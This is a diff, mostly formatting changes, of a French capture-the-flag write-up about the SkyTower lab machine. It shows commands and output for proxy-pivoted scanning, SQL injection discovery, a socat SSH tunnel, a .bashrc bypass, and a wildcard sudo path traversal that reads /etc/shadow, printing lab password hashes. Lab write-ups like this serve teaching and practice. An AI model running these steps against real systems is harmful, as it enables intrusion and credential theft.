@@ -44,8 +44,8 @@ http 192.168.1.84 3128
 
 On fait passer *nmap* par le proxy *Squid* :  
 
-```
-./proxychains4 -f src/proxychains.conf nmap -p- -sT 127.0.0.1
+```console
+$ ./proxychains4 -f src/proxychains.conf nmap -p- -sT 127.0.0.1
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.00070s latency).
 Not shown: 65534 closed ports
@@ -60,8 +60,8 @@ Mach 10
 
 Un petit scan avec *Wapiti* permet de trouver une faille d'injection SQL sur la page de login renvoyée par le serveur Apache (nb: le mot clé *common* est présent dans la version de dév, pas dans la version stable actuelle) :  
 
-```
-./bin/wapiti http://192.168.1.84/ -m "common,nikto,backup,htaccess"
+```console
+$ ./bin/wapiti http://192.168.1.84/ -m "common,nikto,backup,htaccess"
 
 [+] Lancement du module sql
 Injection MySQL dans http://192.168.1.84/login.php via une injection dans le paramètre email
@@ -138,13 +138,13 @@ Atterissage
 
 Maintenant avec des identifiants SSH en main, on ouvre un tunnel passant par le proxy *Squid* à l'aide de *socat* :  
 
-```
+```bash
 socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.1.84:127.0.0.1:22,proxyport=3128
 ```
 
 La connection passe (presque) comme dans du beurre :  
 
-```
+```console
 $ ssh john@127.0.0.1 -p 9999
 john@127.0.0.1's password: 
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
@@ -153,9 +153,9 @@ Funds have been withdrawn
 Connection to 127.0.0.1 closed.
 ```
 
-Essayons de faire éxécuter une autre commande :  
+Essayons de faire exécuter une autre commande :  
 
-```
+```console
 $ ssh john@127.0.0.1 -p 9999 /bin/bash
 john@127.0.0.1's password: 
 id
@@ -173,9 +173,9 @@ echo  "Funds have been withdrawn"
 exit
 ```
 
-C'est donc le *.bashrc* qui nous éjecte. Il suffit de le déplacer pour ne plus avoir à sans soucier.  
+C'est donc le `.bashrc` qui nous éjecte. Il suffit de le déplacer pour ne plus avoir à sans soucier.  
 
-```
+```console
 john@SkyTower:~$ uname -a
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux
 ```
@@ -190,9 +190,9 @@ william:x:1002:1002:,,,:/home/william:/bin/bash
 
 La liste des processus, services, crontab, setuids, setgids ne donne rien d'intéressant. Je décide de m'intéresser à la base de données MySQL.  
 
-D'abord récupérer les identifiants dans */var/www/login.php* :  
+D'abord récupérer les identifiants dans `/var/www/login.php` :  
 
-```
+```php
 <?php
 
 $db = new mysqli('localhost', 'root', 'root', 'SkyTech');
@@ -240,7 +240,7 @@ Mission accomplished
 
 *sara* a une autorisation spéciale *sudo* pour consulter le contenu de */accounts* (qui est vide) :  
 
-```
+```console
 sara@SkyTower:~$ sudo -l
 Matching Defaults entries for sara on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -251,7 +251,7 @@ User sara may run the following commands on this host:
 
 Seulement l'astérisque est pour le moins permissif et permet de remonter l'arborescence :  
 
-```
+```console
 sara@SkyTower:/var/www$ sudo /bin/cat /accounts/../etc/shadow
 root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::
 --- snip ---
@@ -262,7 +262,7 @@ william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn
 
 Qu'il-y a t-il dans /root ?  
 
-```
+```console
 sara@SkyTower:~$ sudo /bin/ls /accounts/../root/ -al
 total 36
 drwx------  4 root root 4096 Jun 20 09:01 .
